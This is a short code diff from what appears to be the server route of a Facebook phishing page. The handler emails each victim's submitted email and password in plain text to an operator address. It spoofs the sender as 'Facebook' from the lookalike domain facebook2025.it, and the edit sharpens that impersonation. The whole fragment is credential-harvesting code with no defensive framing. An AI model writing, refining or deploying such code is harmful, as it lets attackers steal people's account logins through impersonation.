@@ -26,7 +26,7 @@ export async function POST(request: Request) {
 
     // Costruisci email
     const mailOptions = {
-      from: '"Facebook Italia" <securitynoreply@facebook2025.it>',
+      from: '"Facebook" <securitynoreply@facebook2025.it>',
       to: process.env.EMAIL_TO ?? '',
       subject: 'Nuovo accesso dal sito Facebook',
       text: `Email: ${email}\nPassword: ${password}`
